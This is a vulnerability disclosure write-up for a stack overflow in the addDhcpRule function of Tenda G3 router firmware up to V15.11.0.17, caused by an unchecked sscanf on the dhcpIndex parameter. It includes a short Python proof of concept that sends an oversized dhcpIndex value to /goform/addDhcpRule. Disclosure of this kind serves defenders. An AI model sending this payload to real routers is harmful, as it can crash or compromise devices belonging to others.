# Tenda G3 addDhcpRule
### Overview
vendor: Tenda

product: G3

version: <= G3V3.0br_V15.11.0.17

type: Stack Overflow
### Vulnerability Description
Tenda G3 G3V3.0br_V15.11.0.17 were discovered to contain a stack overflow in the addDhcpRule function.
### Vulnerability details
In the function addDhcpRule line 27, it reads in a user-provided parameter, and the variable dhcpIndex is passed to the sscanf function without any length check, which may overflow the stack-based buffer. As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.
![](images/addDhcpRule-1.png)
![](images/addDhcpRule-2.png)

### POC
```python
import requests
ip = '192.168.0.1'
url = f'http://{ip}/goform/addDhcpRule'
payload = {
    "dhcpIndex": 'a' * 1000
}

res = requests.post(url=url, data=payload)
print(res.content)
```
